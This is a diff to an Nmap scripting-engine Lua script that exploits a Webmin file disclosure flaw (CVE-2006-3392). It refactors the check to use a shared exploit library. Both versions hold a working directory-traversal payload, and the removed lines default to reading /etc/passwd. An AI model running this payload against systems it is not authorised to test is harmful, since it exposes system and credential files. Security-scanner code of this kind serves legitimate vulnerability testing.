@@ -2,6 +2,7 @@ local http = require "http"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
 local vulns = require "vulns"
+local exploit = require "exploit"
 
 description = [[
 Exploits a file disclosure vulnerability in Webmin (CVE-2006-3392)
@@ -43,8 +44,6 @@ categories = {"exploit","vuln","intrusive"}
 portrule = shortport.portnumber({10000})
 
 action = function(host, port)
-  local file_var = stdnse.get_script_args(SCRIPT_NAME .. ".file") or "/etc/passwd"
-
   local vuln = {
        title = 'Webmin File Disclosure',
        state = vulns.STATE.NOT_VULN, -- default
@@ -64,16 +63,12 @@ to bypass the removal of "../" directory traversal sequences.
      }
 
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
-  local url = "/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01" .. file_var
+  local payload = "/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01"
 
-  stdnse.debug1("Getting " .. file_var)
-
-  local detection_session = http.get(host, port, url)
-
-  stdnse.debug1("Status code:"..detection_session.status)
-  if detection_session and detection_session.status == 200 then
+  local status, lfi_success, contents = exploit.lfi_check(host, port, payload)
+  stdnse.debug1("LFI STATUS %s", lfi_success)
+  if lfi_success then
     vuln.state = vulns.STATE.EXPLOIT
-    stdnse.debug1(detection_session.body)
-    return vuln_report:make_output(detection_session.body)
+    return vuln_report:make_output(vuln)
   end
 end
